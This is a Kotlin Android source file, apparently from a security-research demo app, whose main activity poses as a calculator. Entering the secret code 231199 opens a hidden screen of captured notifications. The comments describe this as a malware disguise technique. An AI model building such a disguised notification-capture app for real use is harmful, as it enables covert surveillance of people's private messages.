package com.putra.notificationlisteners

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.SystemBarStyle
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import com.putra.notificationlisteners.ui.activity.NotificationHistoryActivity
import com.putra.notificationlisteners.ui.screens.CalculatorScreen
import com.putra.notificationlisteners.ui.theme.NotificationListenersTheme

/**
 * Main Activity — displays the calculator UI by default.
 *
 * This activity serves as the "public face" of the application.
 * To an observer, it appears to be a simple calculator.
 *
 * However, when the user enters the secret code (231199), it
 * navigates to NotificationHistoryActivity where all captured
 * notifications are displayed.
 *
 * SECURITY RESEARCH: This demonstrates a common obfuscation
 * technique used by malware: hiding dangerous functionality
 * behind a benign-looking UI.
 */
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // dark style = light (white) icons on dark background
        enableEdgeToEdge(
            statusBarStyle = SystemBarStyle.dark(android.graphics.Color.TRANSPARENT),
            navigationBarStyle = SystemBarStyle.dark(android.graphics.Color.TRANSPARENT)
        )
        setContent {
            NotificationListenersTheme {
                CalculatorScreen(
                    onSecretCodeTriggered = {
                        // Navigate to hidden notification history
                        navigateToNotificationHistory()
                    }
                )
            }
        }
    }

    /**
     * Navigate to the NotificationHistoryActivity.
     * Called when secret code (231199) is detected.
     */
    private fun navigateToNotificationHistory() {
        val intent = Intent(this, NotificationHistoryActivity::class.java)
        startActivity(intent)
    }
}